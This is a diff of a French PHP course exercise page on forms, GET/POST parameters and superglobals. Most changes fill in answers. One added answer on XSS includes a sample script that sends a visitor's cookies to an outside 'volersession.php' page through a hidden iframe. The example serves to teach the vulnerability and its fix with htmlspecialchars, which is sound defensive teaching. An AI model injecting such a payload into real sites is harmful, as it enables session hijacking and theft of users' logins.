@@ -315,7 +315,7 @@
 						 <li>d’un pied de page: piedPage.php </li>
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 
 							 <pre><code class="language-html" ><source lang="html" line>
 /********  entete.php ******/
@@ -364,7 +364,7 @@
 						 <li>Une solution utilisant la fonction setlocale() </li>
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						                         
 							 <pre><code class="language-php" ><source lang="php" line>
 /********  La fonction date() le fait en anglais ******/
@@ -401,7 +401,7 @@
 					<span style="line-height:2em"> &emsp;&nbsp;&nbsp;sous le r&eacute;pertoire <b>public html/TP1</b></span>
 
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 				<pre><code class="language-php" ><source lang="php">
 scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1	
                 </source></code></pre>
@@ -426,7 +426,7 @@ scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1
 						 <li>Dedans i fo un lien vers <b>form.php</b> </li>
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 <pre><code class="language-html" ><source lang="html">
 /********  form.php ******/
 &lt;!DOCTYPE html>
@@ -472,9 +472,9 @@ scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1
                     
 
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 <div class="paragraphe">
-						     ...
+						     On y voit leurs valeurs
 						 </div>
 					</details>
 					<p></p>	
@@ -485,7 +485,7 @@ scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1
 						 <li>Sinon afficher un message d'erreur</li>						 
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 <pre><code class="language-php" ><source lang="php">
 /********  corps.php ******/
 
@@ -501,7 +501,7 @@ scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1
    $prenom = isset($_GET["prenom"]) ? $_GET["prenom"] : '';
    if(empty($prenom)) echo 'Entrer votre prenom &lt;br>';
    
-   $password= isset($_GET["password"]) ? $_GET["password"] : '';
+   $password=isset($_GET["password"]) ? $_GET["password"] : '';
    if(empty($password)) echo 'Entrer votre password &lt;br>';
    
   // AFFICHAGE
@@ -527,7 +527,7 @@ scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1
                          <li >4.6 <span style="color:#990033">Quel danger pour le passage des pramètres</span>(au niveau de l'URL) </li>						 						 
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 <pre><code class="language-html" ><source lang="html">
 /********  form.php ******/
     ...  	
@@ -600,28 +600,42 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 						 <li>Qu'est-ce qui change ?</li>						 
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
-						 ...
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
+						 <div class="paragraphe">
+						    &#8718; On ne voit pas les données(<small>du formulaire</small>) dans la barre d'adresse<br>
+							&#8718; Je les r&eacute;çois dans une table <b>$_POST[ ]</b>
+						 </div>
 					</details>
 					<p></p>
 					
-					<b class="greenNum">&#9317;</b> <b>Vulnérabilté &#9760; du fichier traitement</b>(corps.php)<br>
+					<b class="greenNum">&#9317;</b> <b>Vulnérabilté  du fichier traitement</b>(corps.php)<br>
 					<span style="line-height:2em"> &emsp;&nbsp;&nbsp; Il peut être appelé par n'importe quelle page( pas seulement form.php)</span>
 					<ul type="disc" class="questions_" >
-					     <li>Quellle conséquence ?! </li>
+					     <li>Quelle conséquence ?! </li>
 						 <li>Et si on met du code HTML dans le champs <b>nom</b> !</li>
-						 <li>Et si(&#9760; oncore pire) on y gave du javascript !! </li>		
+						 <li>Et si on y gave du javascript !! </li>		
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
-						  ...
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
+						 <div class="paragraphe" style="margin-bottom:0.4em !important;">
+						    &#8718; <b>Conséquence</b>: Modifier son contenu pour "passer" le formulaire de login <br>
+							&#8718; <b>Injection HTML</b>: Une balise &lt;a&gt; pour rediriger l'utilisateur vers un autre site qui réaffiche la valeur du champs <b>Nom</b> <br>
+                            &#8718; <b>Injection javaScript</b>: Voler le cookie contenant les paramètres de connexion( en utilisant une rédirection javaScript) <br>							
+						 </div>
+						 <span class="idS subQuestion t-transparent" style="margin-top:0 !important;">&nbsp;&nbsp;Exemple de vol de cookie par injection javaScript</span>
+<pre><code class="language-html" ><source lang="html">
+&lt;script>
+     document.write('&lt;iframe src="https://www.lije-creative.com/volersession.php?'+ 
+	 document.cookie + '" height="0" width="0" style="border:none;" />');
+&lt;/script>	
+</source></code></pre>
 					</details>
 					<p></p>
 					
 					<b class="greenNum">&#9318;</b> Comment résoudre le problème précédent ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
-					    <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					    <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						<ul type="none" class="questions_" style="padding-left:2.8em;" >
 							 <li>
 							     &#9193; &Eacute;chapper le code HTML transmis : fonction&emsp; <b>html<span style="color:#990033">special</span>chars()</b><br>
@@ -653,7 +667,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 						 <li>Le champs "<b>Acc&eacute;der</b>" appelle la page <b>pageProtegee.php</b>(par POST)</li>						 
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -663,7 +677,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
                          <li> affiche un message d'erreur le cas &eacute;ch&eacute;ant  </li>											 
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -673,7 +687,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
                          <li>Le formulaire pointe donc sur lui-même</li>											 
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -688,7 +702,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					<b class="blueNum">&#9312;</b> Qu'est-ce qu'une variable SUPERGLOBALE ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -704,7 +718,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 						 <li><b>En dire deux mots ...</b></li> 						  
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -712,7 +726,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					<b class="blueNum">&#9314;</b> &Agrave; quoi sert la valeur contenu dans <b>&dollar;_SERVER['<span style="color:#f44336;">REMOTE_ADDR</span>']</b> ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -720,7 +734,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					<b class="blueNum">&#9315;</b> &Agrave; quoi sert la variable <b>&dollar;_SESSION</b> ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -733,7 +747,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 						 <li><b>login.php</b> est accessible par un lien depuis <b>corps.php</b> </li> 						  
 					</ul>
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
@@ -750,7 +764,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					</ul>
 					
 					<details>
-					     <summary class="reponse_"><span >R&eacute;ponse ... </span></summary>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
